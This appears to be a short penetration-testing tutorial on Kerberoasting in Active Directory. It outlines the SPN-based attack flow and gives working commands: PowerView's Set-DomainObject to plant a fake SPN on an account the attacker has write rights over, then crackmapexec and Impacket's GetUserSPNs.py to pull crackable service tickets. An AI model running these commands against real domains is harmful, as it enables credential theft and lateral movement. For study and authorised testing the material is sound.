# Kerberoasting: From SPNs to Password Cracking

## High Level Overview:

SPNs are a method way of assigning addresses to services in an Active Directory Domain, but not only limited to services.

They can be assigned automatically, programmatically through scripts like PowerView or manually via setspns.exe

## Low Level Overview:

Kerberoasting Attack Flow:

* Identity service accounts via enumeration of SPNs.
* Request a TGS ticket for the SPN via KDC.
* KDC verifies that a valid TGT exists in this request, validates and returns a TGS encrypted with the password hash of that certain service.
* Crack it manually via hashcat.



## ACLs play a role.

Imagine if we have GenericAll, GenericWrite or specific WriteProperty permissions we can modify/assign anything over that account.

After finding a valid account we can set-up some random SPN to it:

```powershell
Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='fake/RANDOM'}
```

Now we can use it via CME to extract the ticket.

```bash
crackmapexec ldap 10.10.10.10 -u compromised_user -p Password123 --kerberoasting
# Or with Impacket
GetUserSPNs.py -request -dc-ip 10.10.10.10 domain/compromised_user:Password123
```
